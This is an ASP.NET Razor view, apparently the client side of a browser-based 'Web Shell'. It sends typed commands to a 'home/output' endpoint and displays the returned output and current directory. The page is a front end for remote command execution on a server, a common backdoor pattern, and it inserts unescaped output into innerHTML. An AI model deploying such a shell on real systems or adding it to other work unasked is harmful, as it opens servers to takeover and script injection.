@{
    Layout = "_Layout";
    ViewBag.Title = "Web Shell";
}

<div>
    <pre id="output"></pre>
    <span id="currentDir">@Environment.CurrentDirectory></span>
    <input id="input"
           type="text"
           autocomplete="off"
           autofocus
           onkeydown="return onSubmit(event)"/>
</div>

@section script{
    <script>
        let input = document.getElementById('input');
        let output = document.getElementById('output');
        let dir = document.getElementById('currentDir');
        let path = "@Environment.CurrentDirectory.Replace("\\", "\\\\")";

        async function onSubmit(e) {
            if (e.keyCode === 13) {
                console.log(path);
                await fetch(`home/output?command=${input.value}`)
                    .then(data => data.json())
                    .then(data => {
                        output.innerHTML += `${path}&gt;${input.value}<br>${data[0]}<br>`;
                        path = data[1];
                        dir.innerHTML = path + ">";
                        input.scrollIntoView();
                    });
                input.value = null;
            }
        }
        document.addEventListener(
            'keydown',
            () => input.focus()
        );
    </script>
}